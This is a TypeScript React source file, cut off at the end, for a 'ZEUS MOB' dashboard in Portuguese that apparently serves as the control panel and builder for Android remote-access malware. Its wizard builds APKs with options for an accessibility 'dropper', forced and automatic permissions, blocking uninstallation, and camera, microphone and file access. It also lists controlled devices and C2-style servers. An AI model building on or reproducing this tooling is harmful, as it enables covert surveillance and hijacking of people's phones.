import { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import { useAuth } from "@/lib/auth";
import {
  Users, Zap, Bell, Layers, Ban, Dog, Settings, LogOut,
  Search, Plus, Play, Pause, Box, Clock, Timer,
  ArrowUpCircle, ArrowDownCircle, Activity, Mail, Key,
  Upload, Download, Pencil, Trash2, FileText, Link2,
  Smartphone, ImagePlus, X, ChevronRight, ChevronLeft,
  Loader2, RefreshCw, Check, Shield, Cpu, Lock, LockOpen,
  Monitor, Volume2, VolumeX, LayoutGrid, Maximize2,
  Eye, EyeOff, Camera, Navigation2, Cast, Keyboard, Type,
  Wifi, Battery, ShoppingCart, MousePointer, Square,
} from "lucide-react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";

/* ─────────────────────────────────────────
   Types
───────────────────────────────────────── */
interface ApkForm {
  clientName: string; appName: string; appLink: string;
  notifTitle: string; notifMessage: string;
  appVersion: string; appId: string;
  iconPreview: string | null;
  perms: Record<string, boolean>;
  behavior: Record<string, boolean>;
  advanced: Record<string, boolean>;
}

const PERMISSIONS = [
  { key: "accessibility",  label: "Accessibility Service",   icon: "♿" },
  { key: "app_usage",      label: "App Usage",               icon: "📊" },
  { key: "draw_over",      label: "Draw Over Apps",          icon: "🖼️" },
  { key: "camera",         label: "Câmera Access",           icon: "📷" },
  { key: "files",          label: "Files Access",            icon: "📁" },
  { key: "microphone",     label: "Microfone Access",        icon: "🎙️" },
];
const BEHAVIORS = [
  { key: "prevent_sleep",  label: "Prevenir Modo Sono",      icon: "💤" },
  { key: "prevent_stop",   label: "Prevenir Paradas",        icon: "🛑" },
  { key: "force_perms",    label: "Forçar Permissões",       icon: "⚡" },
];
const ADVANCED = [
  { key: "acc_dropper",    label: "Accessibility Guid / Dropper", icon: "🎯" },
  { key: "prevent_del",    label: "Prevenir Exclusão",       icon: "🔒" },
  { key: "auto_perms",     label: "Permissões Automáticas",  icon: "🤖" },
  { key: "screen_lock",    label: "Registro de Bloqueio de Tela", icon: "📱" },
];

function makeId(appName: string) {
  const slug = appName.replace(/\s+/g, "").toLowerCase().replace(/[^a-z0-9]/g, "") || "app";
  const rand = Math.floor(1000 + Math.random() * 9000);
  return `com.zeus.${slug}${rand}`;
}
function makeVersion() {
  const patch = Math.floor(Math.random() * 10);
  const build = Math.floor(100 + Math.random() * 900);
  return `1.0.${patch} (${build})`;
}

const EMPTY_FORM: ApkForm = {
  clientName: "", appName: "", appLink: "",
  notifTitle: "", notifMessage: "",
  appVersion: makeVersion(), appId: "",
  iconPreview: null,
  perms:    Object.fromEntries(PERMISSIONS.map(p => [p.key, false])),
  behavior: Object.fromEntries(BEHAVIORS.map(b => [b.key, false])),
  advanced: Object.fromEntries(ADVANCED.map(a => [a.key, false])),
};

const STEPS = ["Informações", "Permissões", "Funcionamento", "Avançado"] as const;

/* ─────────────────────────────────────────
   Device types + mock data
───────────────────────────────────────── */
interface Device {
  id: string; name: string; model: string;
  ip: string; androidVersion: string;
  battery: number; online: boolean;
}
const MOCK_DEVICES: Device[] = [
  { id: "d1", name: "Samsung Galaxy A54",    model: "SM-A546B",    ip: "192.168.1.105", androidVersion: "14", battery: 78, online: true  },
  { id: "d2", name: "Motorola Edge 30",       model: "XT2203-1",    ip: "192.168.1.112", androidVersion: "13", battery: 42, online: true  },
  { id: "d3", name: "Xiaomi Redmi Note 12",   model: "2209116AG",   ip: "192.168.1.118", androidVersion: "12", battery: 91, online: false },
];

/* ─────────────────────────────────────────
   Dashboard
───────────────────────────────────────── */
export default function Dashboard() {
  const { isAuthenticated, logout } = useAuth();
  const [, setLocation] = useLocation();
  const [apkOpen, setApkOpen] = useState(false);
  const [step, setStep] = useState(0);
  const [form, setForm] = useState<ApkForm>(EMPTY_FORM);
  const [generating, setGenerating] = useState(false);
  const [done, setDone] = useState(false);
  const iconRef = useRef<HTMLInputElement>(null);

  // Login time for session timer
  const loginTime = useRef<number>(Date.now());

  // Device panel
  const [devicePanelOpen, setDevicePanelOpen] = useState(false);
  const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);

  useEffect(() => {
    if (!isAuthenticated) setLocation("/login");
  }, [isAuthenticated, setLocation]);

  if (!isAuthenticated) return null;

  function handleField(key: keyof ApkForm, val: string) {
    setForm(f => ({ ...f, [key]: val }));
    setDone(false);
  }
  function toggleMap(group: "perms" | "behavior" | "advanced", key: string) {
    setForm(f => ({ ...f, [group]: { ...f[group], [key]: !f[group][key] } }));
  }
  function handleIcon(e: React.ChangeEvent<HTMLInputElement>) {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = ev => handleField("iconPreview", ev.target?.result as string);
    reader.readAsDataURL(file);
  }
  function regenId()  { handleField("appId", makeId(form.appName)); }
  function regenVer() { handleField("appVersion", makeVersion()); }

  function handleClose() {
    setApkOpen(false); setDone(false); setGenerating(false);
    setStep(0); setForm({ ...EMPTY_FORM, appVersion: makeVersion(), appId: "" });
  }
  const [buildLog, setBuildLog] = useState("");
  const [apkBlob, setApkBlob] = useState<{ url: string; name: string } | null>(null);

  async function handleGenerate() {
    setGenerating(true); setDone(false); setBuildLog(""); setApkBlob(null);

    try {
      setBuildLog("Preparando projeto Android...");

      const payload = {
        appName:     form.appName     || "ZeusMob",
        clientName:  form.clientName,
        appLink:     form.appLink,
        notifTitle:  form.notifTitle,
        notifMessage:form.notifMessage,
        appVersion:  form.appVersion,
        appId:       form.appId       || "com.zeusmob.app",
        iconBase64:  form.iconPreview ?? undefined,
        perms:       form.perms,
        behavior:    form.behavior,
        advanced:    form.advanced,
      };

      setBuildLog("Compilando APK com Gradle (1–3 min)...");

      const resp = await fetch(`${import.meta.env.BASE_URL}api/apk/build`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        signal: AbortSignal.timeout(5 * 60 * 1000),
      });

      if (!resp.ok) {
        const err = await resp.json().catch(() => ({ error: resp.statusText }));
        throw new Error(err.detail || err.error || "Build falhou");
      }

      const disposition = resp.headers.get("Content-Disposition") || "";
      const nameMatch   = disposition.match(/filename="([^"]+)"/);
      const apkName     = nameMatch ? nameMatch[1] : "zeusmob.apk";

      const blob    = await resp.blob();
      const blobUrl = URL.createObjectURL(blob);

      setApkBlob({ url: blobUrl, name: apkName });
      setBuildLog(`APK gerado com sucesso! (${(blob.size / 1024 / 1024).toFixed(1)} MB)`);
      setDone(true);
    } catch (e: any) {
      setBuildLog(`Erro: ${e.message}`);
      setDone(false);
    } finally {
      setGenerating(false);
    }
  }

  function downloadApk() {
    if (!apkBlob) return;
    const a = document.createElement("a");
    a.href = apkBlob.url;
    a.download = apkBlob.name;
    a.click();
  }

  const canNext = step < STEPS.length - 1;
  const canPrev = step > 0;

  return (
    <div className="flex h-screen w-full bg-[#0b0f1a] text-foreground overflow-hidden font-sans">

      {/* ── Sidebar ── */}
      <aside className="w-[46px] flex-shrink-0 bg-[#0d1220] border-r border-primary/15 flex flex-col justify-between z-20">
        <div className="flex flex-col items-center gap-0.5 pt-1.5">
          <div className="w-8 h-8 rounded-md border border-primary/60 flex items-center justify-center bg-primary/10 mb-2 neon-border">
            <Zap className="w-4 h-4 text-primary" />
          </div>
          <div className="relative">
            <SidebarIcon icon={Smartphone} label="Dispositivos"
              active={devicePanelOpen}
              onClick={() => setDevicePanelOpen(p => !p)} />
            {MOCK_DEVICES.filter(d => d.online).length > 0 && (
              <span className="absolute -top-0.5 -right-0.5 w-3 h-3 rounded-full bg-[#00ff9d] border border-[#0d1220] shadow-[0_0_5px_#00ff9d] flex items-center justify-center text-[6px] font-bold text-[#0b0f1a] pointer-events-none">
                {MOCK_DEVICES.filter(d => d.online).length}
              </span>
            )}
          </div>
          <SidebarIcon icon={Users}  label="Usuários" />
          <SidebarIcon icon={Zap}    label="Conexões" />
          <SidebarIcon icon={Bell}   label="Notificações" />
          <SidebarIcon icon={Layers} label="Camadas" />
          <SidebarIcon icon={Ban}    label="Bloqueios" />
          <SidebarIcon icon={Dog}    label="Guardião" />
        </div>
        <div className="flex flex-col items-center gap-1 pb-2">
          <SidebarIcon icon={Settings} label="Configurações" />
          <SidebarIcon icon={LogOut}   label="Sair" onClick={() => logout()} variant="destructive" />
          <p className="text-[6px] font-orbitron text-primary/30 uppercase tracking-widest text-center leading-tight mt-1">ZEUS<br />MOB</p>
        </div>
      </aside>

      {/* ── Device List Panel ── */}
      {devicePanelOpen && (
        <DeviceListPanel
          onClose={() => setDevicePanelOpen(false)}
          onSelect={d => { setSelectedDevice(d); }}
        />
      )}

      {/* ── Main ── */}
      <main className="flex-1 flex flex-col overflow-hidden">
        <div className="flex items-center gap-2 px-4 py-1.5 border-b border-primary/10 bg-[#0d1220]/80 backdrop-blur-sm flex-shrink-0">
          <div className="w-7 h-7 rounded border border-primary/60 bg-primary/10 flex items-center justify-center neon-border shrink-0">
            <Zap className="w-3.5 h-3.5 text-primary" />
          </div>
          <span className="font-orbitron text-sm font-bold text-primary tracking-widest neon-text">ZEUS MOB</span>
          <span className="text-[10px] text-muted-foreground tracking-wider hidden sm:inline">Multiple server manager</span>
        </div>

        <div className="flex-1 overflow-y-auto overflow-x-hidden">
          <div className="p-3 space-y-2.5 min-w-0">

            <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
              <StatCard icon={Activity}        label="Online"         value="2" />
              <StatCard icon={Link2}           label="Conexões"       value="12" />
              <StatCard icon={ArrowUpCircle}   label="Total Sent"     value="335,72 KB" />
              <StatCard icon={ArrowDownCircle} label="Total recebido" value="5,62 MB" />
            </div>

            <div className="flex flex-wrap items-center gap-2">
              <div className="relative min-w-[160px]">
                <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3 h-3 text-muted-foreground" />
                <Input placeholder="Buscar por nome, IP ou er" className="pl-7 h-8 text-xs bg-[#0d1220] border-primary/20 focus-visible:ring-primary placeholder:text-muted-foreground/50 w-full" data-testid="input-search" />
              </div>
              <Select defaultValue="recent">
                <SelectTrigger className="h-8 text-xs bg-[#0d1220] border-primary/20 text-foreground/80 w-[150px]" data-testid="select-order">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent className="bg-[#0d1220] border-primary/20 text-xs">
                  <SelectItem value="recent">Ordenar: recentes</SelectItem>
                  <SelectItem value="oldest">Ordenar: antigos</SelectItem>
                  <SelectItem value="name">Ordenar: nome</SelectItem>
                </SelectContent>
              </Select>
              <div className="flex-1" />
              <Button variant="outline" size="sm" onClick={() => { setStep(0); setApkOpen(true); }}
                className="h-8 text-xs border-primary/40 text-primary hover:bg-primary/15 hover:border-primary/70 hover:shadow-[0_0_10px_rgba(0,212,255,0.2)] gap-1.5 font-orbitron tracking-wider"
                data-testid="button-generate-apk">
                <Box className="w-3.5 h-3.5" />Gerar APK
              </Button>
              <Button variant="outline" size="sm" className="h-8 text-xs border-primary/30 text-primary/80 hover:bg-primary/10 gap-1.5" data-testid="button-import">
                <Download className="w-3 h-3" />Importar
              </Button>
              <Button variant="outline" size="sm" className="h-8 text-xs border-primary/30 text-primary/80 hover:bg-primary/10 gap-1.5" data-testid="button-export">
                <Upload className="w-3 h-3" />Exportar
              </Button>
              <Button size="sm" className="h-8 text-xs bg-primary hover:bg-primary/80 text-[#0b0f1a] font-orbitron font-bold tracking-wider gap-1.5 shadow-[0_0_12px_rgba(0,212,255,0.35)]" data-testid="button-add-server">
                <Plus className="w-3.5 h-3.5" />Adicionar servidor
              </Button>
            </div>

            <div className="space-y-2">
              <ServerCard abbr="ZA" name="ZEUS_INSTANCE_A1" ip="82.153.205.57" status="CONNECTED" email="zeusmob.json@cloud.net" tag="ZEUS" added="03/05/2026, 17:25:11"
                sessionStart={loginTime.current}
                stats={{ connections: "1", sent: "0 Bytes", received: "0 Bytes", latency: "214 ms" }} />
              <ServerCard abbr="AB" name="APOLLO_NODE_B4" ip="45.221.190.12" status="CONNECTED" email="apollo.admin@cybernetics.net" tag="APOLLO" added="04/05/2026, 09:12:44"
                sessionStart={loginTime.current}
                stats={{ connections: "11", sent: "45.2 KB", received: "1.2 MB", latency: "18 ms" }} />
            </div>
          </div>
        </div>

        <div className="absolute bottom-0 right-0 px-3 py-1 bg-[#0b0f1a]/90 border-t border-l border-primary/10 text-[9px] font-orbitron text-primary/40 tracking-widest z-20 rounded-tl-sm">
          @ZEUSMOB_DEV_PORT | ZEUSMOB | JSON
        </div>
      </main>

      {/* ── Device Control Modal ── */}
      {selectedDevice && (
        <DeviceControlModal device={selectedDevice} onClose={() => setSelectedDevice(null)} />
      )}

      {/* ══════════════════════════════════════════
          APK WIZARD MODAL
      ══════════════════════════════════════════ */}
      <Dialog open={apkOpen} onOpenChange={open => { if (!open) handleClose(); }}>
        <DialogContent className="bg-[#0d1220] border border-primary/30 text-foreground shadow-[0_0_50px_rgba(0,212,255,0.10)] max-w-xl w-full p-0 overflow-hidden rounded-xl">

          {/* ── Modal header ── */}
          <div className="flex items-center gap-3 px-5 pt-4 pb-3 border-b border-primary/15">
            <div className="w-8 h-8 rounded-md bg-primary/15 border border-primary/50 flex items-center justify-center shrink-0">
              <Box className="w-4 h-4 text-primary" />
            </div>
            <div className="flex-1">
              <p className="font-orbitron text-sm font-bold text-primary tracking-widest neon-text">GERAR APK</p>
              <p className="text-[10px] text-muted-foreground mt-0.5">Etapa {step + 1} de {STEPS.length} — {STEPS[step]}</p>
            </div>
            <button onClick={handleClose} className="w-7 h-7 rounded border border-primary/20 flex items-center justify-center text-muted-foreground hover:text-primary hover:border-primary/50 hover:bg-primary/10 transition-all" data-testid="button-close-apk">
              <X className="w-3.5 h-3.5" />
            </button>
          </div>

          {/* ── Step indicator ── */}
          <div className="flex items-center px-5 py-2 gap-1.5 border-b border-primary/10">
            {STEPS.map((s, i) => (
              <div key={s} className="flex items-center gap-1.5 flex-1">
                <div className={`w-5 h-5 rounded-full border flex items-center justify-center text-[9px] font-orbitron font-bold shrink-0 transition-all
                  ${i < step ? "bg-primary border-primary text-[#0b0f1a]"
                  : i === step ? "border-primary text-primary shadow-[0_0_6px_rgba(0,212,255,0.4)]"
                  : "border-primary/20 text-primary/30"}`}>
                  {i < step ? <Check className="w-2.5 h-2.5" /> : i + 1}
                </div>
                <span className={`text-[9px] tracking-wide truncate hidden sm:block ${i === step ? "text-primary" : i < step ? "text-primary/60" : "text-primary/25"}`}>{s}</span>
                {i < STEPS.length - 1 && <div className={`h-px flex-1 ${i < step ? "bg-primary/50" : "bg-primary/10"}`} />}
              </div>
            ))}
          </div>

          {/* ── Step body ── */}
          <div className="px-5 py-4 overflow-y-auto max-h-[65vh] space-y-4">

            {/* STEP 0 — Informações básicas */}
            {step === 0 && (
              <>
                {/* Icon + names */}
                <div className="flex gap-4 items-start">
                  <div className="shrink-0">
                    <p className="text-[9px] uppercase tracking-widest text-muted-foreground mb-1.5">Ícone</p>
                    <button type="button" onClick={() => iconRef.current?.click()} data-testid="button-upload-icon"
                      className="w-16 h-16 rounded-xl border-2 border-dashed border-primary/30 bg-primary/5 flex flex-col items-center justify-center gap-1 hover:border-primary/60 hover:bg-primary/10 transition-all group overflow-hidden">
                      {form.iconPreview
                        ? <img src={form.iconPreview} alt="icon" className="w-full h-full object-cover rounded-xl" />
                        : <><ImagePlus className="w-5 h-5 text-primary/40 group-hover:text-primary transition-all" /><span className="text-[8px] text-muted-foreground/50 text-center leading-tight">Upload</span></>
                      }
                    </button>
                    <input ref={iconRef} type="file" accept="image/*" className="hidden" onChange={handleIcon} data-testid="input-icon-file" />
                  </div>
                  <div className="flex-1 space-y-2.5">
                    <Field label="Nome do Cliente" placeholder="ex: Empresa XYZ" value={form.clientName} onChange={v => handleField("clientName", v)} testId="input-client-name" required />
                    <Field label="Nome do Aplicativo" placeholder="ex: MeuApp Pro" value={form.appName} onChange={v => handleField("appName", v)} testId="input-app-name" required />
                  </div>
                </div>

                <Field label="Link do Aplicativo" placeholder="https://seusite.com/app" value={form.appLink} onChange={v => handleField("appLink", v)} testId="input-app-link" icon={<Link2 className="w-3 h-3" />} required />

                <div className="grid grid-cols-2 gap-3">
                  <Field label="Título da Notificação" placeholder="ex: Nova atualização!" value={form.notifTitle} onChange={v => handleField("notifTitle", v)} testId="input-notif-title" required />
                  <div>
                    <p className="text-[9px] uppercase tracking-widest text-muted-foreground mb-1.5">Mensagem da Notificação <span className="text-destructive">*</span></p>
                    <Textarea placeholder="Texto push..." value={form.notifMessage} onChange={e => handleField("notifMessage", e.target.value)} data-testid="input-notif-message"
                      className="bg-[#0b0f1a] border-primary/20 focus-visible:ring-primary text-xs placeholder:text-muted-foreground/40 resize-none h-[58px]" required />
                  </div>
                </div>

                {/* Auto ID + Version */}
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <p className="text-[9px] uppercase tracking-widest text-muted-foreground mb-1.5">ID do Aplicativo <span className="text-destructive">*</span></p>
                    <div className="flex gap-1">
                      <Input value={form.appId} onChange={e => handleField("appId", e.target.value)} placeholder="Gerar automaticamente" data-testid="input-app-id"
                        className="bg-[#0b0f1a] border-primary/20 focus-visible:ring-primary text-xs placeholder:text-muted-foreground/40 h-8 flex-1 font-mono" required />
                      <button type="button" onClick={regenId} title="Gerar ID" data-testid="button-regen-id"
                        className="w-8 h-8 rounded border border-primary/25 text-primary/60 hover:text-primary hover:border-primary/50 hover:bg-primary/10 flex items-center justify-center transition-all shrink-0">
                        <RefreshCw className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>
                  <div>
                    <p className="text-[9px] uppercase tracking-widest text-muted-foreground mb-1.5">Versão <span className="text-destructive">*</span></p>
                    <div className="flex gap-1">
                      <Input value={form.appVersion} onChange={e => handleField("appVersion", e.target.value)} placeholder="1.0.0" data-testid="input-app-version"
                        className="bg-[#0b0f1a] border-primary/20 focus-visible:ring-primary text-xs h-8 flex-1 font-mono" required />
                      <button type="button" onClick={regenVer} title="Gerar versão" data-testid="button-regen-version"
                        className="w-8 h-8 rounded border border-primary/25 text-primary/60 hover:text-primary hover:border-primary/50 hover:bg-primary/10 flex items-center justify-center transition-all shrink-0">
                        <RefreshCw className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>
                </div>
              </>
            )}

            {/* STEP 1 — Permissões */}
            {step === 1 && (
              <div>
                <div className="flex items-center gap-2 mb-3">
                  <Shield className="w-4 h-4 text-primary" />
                  <p className="text-xs font-semibold text-primary">Permissões que o APK vai usar</p>
                </div>
                <p className="text-[10px] text-muted-foreground mb-4">Selecione as permissões que o aplicativo irá solicitar ao usuário.</p>
                <div className="space-y-1.5">
                  {PERMISSIONS.map(p => (
                    <ToggleRow
                      key={p.key}
                      emoji={p.icon}
                      label={p.label}
                      checked={form.perms[p.key]}
                      onChange={() => toggleMap("perms", p.key)}
                      testId={`perm-${p.key}`}
                    />
                  ))}
                </div>
              </div>
            )}

            {/* STEP 2 — Funcionamento */}
            {step === 2 && (
              <div>
                <div className="flex items-center gap-2 mb-3">
                  <Cpu className="w-4 h-4 text-primary" />
                  <p className="text-xs font-semibold text-primary">Como o aplicativo deve funcionar</p>
                </div>
                <p className="text-[10px] text-muted-foreground mb-4">Configure o comportamento do aplicativo em segundo plano.</p>
                <div className="space-y-1.5">
                  {BEHAVIORS.map(b => (
                    <ToggleRow
                      key={b.key}
                      emoji={b.icon}
                      label={b.label}
                      checked={form.behavior[b.key]}
                      onChange={() => toggleMap("behavior", b.key)}
                      testId={`behavior-${b.key}`}
                    />
                  ))}
                </div>
              </div>
            )}

            {/* STEP 3 — Avançado + Gerar */}
            {step === 3 && (
              <div>
                <div className="flex items-center gap-2 mb-3">
                  <Lock className="w-4 h-4 text-primary" />
                  <p className="text-xs font-semibold text-primary">Configurações avançadas</p>
                </div>
                <p className="text-[10px] text-muted-foreground mb-4">Opções de segurança e automação do aplicativo.</p>
                <div className="space-y-1.5 mb-5">
                  {ADVANCED.map(a => (
                    <ToggleRow
                      key={a.key}
                      emoji={a.icon}
                      label={a.label}
                      checked={form.advanced[a.key]}
                      onChange={() => toggleMap("advanced", a.key)}
                      testId={`adv-${a.key}`}
                    />
                  ))}
                </div>

                {/* Summary */}
                <div className="rounded-lg border border-primary/15 bg-primary/5 px-4 py-3 space-y-1 text-[10px] text-muted-foreground">
                  <p className="text-primary font-orbitron text-[10px] tracking-widest mb-2">RESUMO DO BUILD</p>
                  <p><span className="text-foreground/60">App:</span> <span className="text-primary">{form.appName || "—"}</span></p>
                  <p><span className="text-foreground/60">ID:</span> <span className="text-primary font-mono">{form.appId || "—"}</span></p>
                  <p><span className="text-foreground/60">Versão:</span> <span className="text-primary">{form.appVersion}</span></p>
                  <p><span className="text-foreground/60">Permissões:</span> <span className="text-primary">{PERMISSIONS.filter(p => form.perms[p.key]).map(p => p.label).join(", ") || "nenhuma"}</span></p>
                  <p><span className="text-foreground/60">Comportamento:</span> <span className="text-primary">{BEHAVIORS.filter(b => form.behavior[b.key]).map(b => b.label).join(", ") || "padrão"}</span></p>
                </div>

                {/* Build log / progress */}
                {(generating || buildLog) && (
                  <div className={`mt-4 flex items-start gap-3 px-4 py-3 rounded-lg border ${done ? "bg-[#00ff9d]/10 border-[#00ff9d]/30" : buildLog.startsWith("Erro") ? "bg-destructive/10 border-destructive/30" : "bg-primary/10 border-primary/30"}`}>
                    {generating ? (
                      <Loader2 className="w-3.5 h-3.5 text-primary animate-spin shrink-0 mt-0.5" />
                    ) : done ? (
                      <span className="w-2 h-2 rounded-full bg-[#00ff9d] shadow-[0_0_6px_#00ff9d] shrink-0 animate-pulse mt-1" />
                    ) : (
                      <span className="w-2 h-2 rounded-full bg-destructive shrink-0 mt-1" />
                    )}
                    <div className="flex-1 min-w-0">
                      <p className={`text-[11px] font-semibold ${done ? "text-[#00ff9d]" : buildLog.startsWith("Erro") ? "text-destructive" : "text-primary"}`}>
                        {buildLog || "Iniciando build…"}
                      </p>
                      {done && apkBlob && (
                        <p className="text-[9px] text-[#00ff9d]/70 mt-0.5">{form.appName} · {apkBlob.name}</p>
                      )}
                    </div>
                    {done && apkBlob && (
                      <button onClick={downloadApk} data-testid="button-download-apk"
                        className="flex items-center gap-1 text-[10px] text-[#00ff9d] hover:underline shrink-0">
                        <Download className="w-3 h-3" /> Baixar
                      </button>
                    )}
                  </div>
                )}
              </div>
            )}
          </div>

          {/* ── Footer navigation ── */}
          <div className="flex items-center justify-between px-5 py-3 border-t border-primary/15 bg-[#0b0f1a]/40">
            <Button variant="outline" size="sm" onClick={() => setStep(s => s - 1)} disabled={!canPrev}
              className="h-8 text-xs border-primary/20 text-muted-foreground hover:text-primary hover:border-primary/40 gap-1.5" data-testid="button-prev-step">
              <ChevronLeft className="w-3.5 h-3.5" />Voltar
            </Button>

            <div className="flex gap-1">
              {STEPS.map((_, i) => (
                <div key={i} className={`w-1.5 h-1.5 rounded-full transition-all ${i === step ? "bg-primary shadow-[0_0_4px_rgba(0,212,255,0.8)]" : i < step ? "bg-primary/40" : "bg-primary/15"}`} />
              ))}
            </div>

            {canNext ? (
              <Button size="sm" onClick={() => setStep(s => s + 1)}
                className="h-8 text-xs bg-primary hover:bg-primary/80 text-[#0b0f1a] font-orbitron font-bold tracking-wider gap-1.5 shadow-[0_0_10px_rgba(0,212,255,0.3)]" data-testid="button-next-step">
                Continuar <ChevronRight className="w-3.5 h-3.5" />
              </Button>
            ) : (
              <Button size="sm" onClick={handleGenerate} disabled={generating}
                className="h-8 text-xs bg-primary hover:bg-primary/80 text-[#0b0f1a] font-orbitron font-bold tracking-wider gap-1.5 shadow-[0_0_12px_rgba(0,212,255,0.4)] min-w-[130px]" data-testid="button-submit-apk">
                {generating
                  ? <><Loader2 className="w-3.5 h-3.5 animate-spin" />Gerando...</>
                  : <><Smartphone className="w-3.5 h-3.5" />Gerar APK</>
                }
              </Button>
            )}
          </div>

        </DialogContent>
      </Dialog>
    </div>
  );
}

/* ──────────── Live widgets ──────────── */
function LiveClock() {
  const [now, setNow] = useState(new Date());
  useEffect(() => {
    const id = setInterval(() => setNow(new Date()), 1000);
    return () => clearInterval(id);
  }, []);
  const p = (n: number) => String(n).padStart(2, "0");
  return <>{`${p(now.getDate())}/${p(now.getMonth() + 1)}/${now.getFullYear()}, ${p(now.getHours())}:${p(now.getMinutes())}:${p(now.getSeconds())}`}</>;
}

function LiveTimer({ since }: { since: number }) {
  const [elapsed, setElapsed] = useState(() => Date.now() - since);
  useEffect(() => {
    const id = setInterval(() => setElapsed(Date.now() - since), 1000);
    return () => clearInterval(id);
  }, [since]);
  const h = Math.floor(elapsed / 3_600_000);
  const m = Math.floor((elapsed % 3_600_000) / 60_000);
  const s = Math.floor((elapsed % 60_000) / 1_000);
  const p = (n: number) => String(n).padStart(2, "0");
  return <>{`${p(h)}:${p(m)}:${p(s)}`}</>;
}

/* ──────────── Sub-components ──────────── */
function SidebarIcon({ icon: Icon, label, active, onClick, variant = "primary" }: {
  icon: React.ElementType; label: string; active?: boolean; onClick?: () => void; variant?: string;
}) {
  return (
    <button onClick={onClick} title={label}
      className={`group relative flex items-center justify-center w-8 h-8 rounded-md transition-all duration-150 ${active ? "bg-primary/20 border border-primary/40" : "hover:bg-primary/10 border border-transparent"}`}
      data-testid={`sidebar-${label.toLowerCase()}`}>
      <Icon className={`w-3.5 h-3.5 transition-all ${variant === "destructive" ? "text-destructive" : "text-primary/70 group-hover:text-primary group-hover:drop-shadow-[0_0_5px_rgba(0,212,255,0.7)]"}`} />
      <span className="absolute left-full ml-2 px-2 py-0.5 bg-[#0d1220] border border-primary/25 rounded text-[10px] text-primary opacity-0 group-hover:opacity-100 pointer-events-none whitespace-nowrap z-50 shadow-lg">{label}</span>
    </button>
  );
}

function StatCard({ icon: Icon, label, value }: { icon: React.ElementType; label: string; value: string }) {
  return (
    <div className="bg-[#0d1220] border border-primary/15 rounded-lg px-4 py-3 hover:border-primary/35 transition-all">
      <div className="flex items-center gap-1.5 text-muted-foreground mb-1">
        <Icon className="w-3 h-3" />
        <span className="text-[10px] tracking-wide">{label}</span>
      </div>
      <p className="text-primary text-base font-bold leading-none">{value}</p>
    </div>
  );
}

function ServerCard({ abbr, name, ip, status, email, tag, added, sessionStart, stats }: {
  abbr: string; name: string; ip: string; status: string;
  email: string; tag: string; added: string; sessionStart: number;
  stats: { connections: string; sent: string; received: string; latency: string };
}) {
  return (
    <div className="bg-[#0d1220] border border-primary/20 rounded-lg overflow-hidden hover:border-primary/45 transition-all hover:shadow-[0_0_14px_rgba(0,212,255,0.08)]">
      <div className="overflow-x-auto">
        <div className="min-w-[950px]">
          <div className="flex items-center gap-3 px-3 py-2.5 border-b border-white/5">
            <div className="w-9 h-9 rounded-md border border-primary/50 bg-primary/10 flex items-center justify-center shrink-0">
              <span className="font-orbitron text-[11px] font-bold text-primary">{abbr}</span>
            </div>
            <span className="font-orbitron text-sm font-bold text-primary tracking-wider shrink-0">{name}</span>
            <span className="text-xs text-foreground/60 font-mono shrink-0">{ip}</span>
            <span className="flex items-center gap-1.5 px-2.5 py-0.5 rounded-sm border border-primary/30 bg-primary/5 text-[10px] font-orbitron text-primary shrink-0">
              <span className="w-1.5 h-1.5 rounded-full bg-[#00ff9d] shadow-[0_0_4px_#00ff9d] animate-pulse" />{status}
            </span>
            <div className="flex-1" />
            <div className="flex items-center gap-1 shrink-0">
              <ActionBtn icon={Play}   tip="Play"    id={`play-${name}`} />
              <ActionBtn icon={Pause}  tip="Pause"   id={`pause-${name}`} />
              <ActionBtn icon={Box}    tip="Box"     id={`box-${name}`} />
              <ActionBtn icon={Pencil} tip="Editar"  id={`edit-${name}`} />
              <ActionBtn icon={Trash2} tip="Excluir" id={`del-${name}`} danger />
            </div>
          </div>
          <div className="flex items-center gap-4 px-3 py-1.5 border-b border-white/5 text-[10px] text-muted-foreground">
            <span className="flex items-center gap-1.5"><Mail className="w-2.5 h-2.5" />{email}</span>
            <span className="flex items-center gap-1.5"><Key className="w-2.5 h-2.5" />{tag}</span>
            <span className="flex items-center gap-1.5"><Clock className="w-2.5 h-2.5" />added {added}</span>
            <span className="flex items-center gap-1.5"><FileText className="w-2.5 h-2.5" />—</span>
          </div>
          <div className="flex items-stretch divide-x divide-white/5">
            <StatBlock icon={Clock}           label="Start Time"       liveType="clock" sessionStart={sessionStart} />
            <StatBlock icon={Timer}           label="Session Duration" liveType="timer" sessionStart={sessionStart} />
            <StatBlock icon={Users}           label="Connections"      value={stats.connections} />
            <StatBlock icon={ArrowUpCircle}   label="Total Sent"       value={stats.sent} />
            <StatBlock icon={ArrowDownCircle} label="Total Received"   value={stats.received} />
            <StatBlock icon={Activity}        label="Latency"          value={stats.latency} green />
          </div>
        </div>
      </div>
    </div>
  );
}

function ActionBtn({ icon: Icon, tip, id, danger }: { icon: React.ElementType; tip: string; id: string; danger?: boolean }) {
  return (
    <button title={tip} data-testid={`btn-${id}`}
      className={`w-7 h-7 rounded border flex items-center justify-center transition-all
        ${danger ? "border-destructive/25 text-destructive/70 hover:bg-destructive/15 hover:border-destructive/50 hover:text-destructive"
        : "border-primary/20 text-primary/60 hover:bg-primary/15 hover:border-primary/50 hover:text-primary hover:shadow-[0_0_6px_rgba(0,212,255,0.25)]"}`}>
      <Icon className="w-3.5 h-3.5" />
    </button>
  );
}

function StatBlock({ icon: Icon, label, value, green, liveType, sessionStart }: {
  icon: React.ElementType; label: string; value?: string; green?: boolean;
  liveType?: "clock" | "timer"; sessionStart?: number;
}) {
  return (
    <div className="flex-1 flex items-start gap-1.5 px-3 py-2 min-w-[130px]">
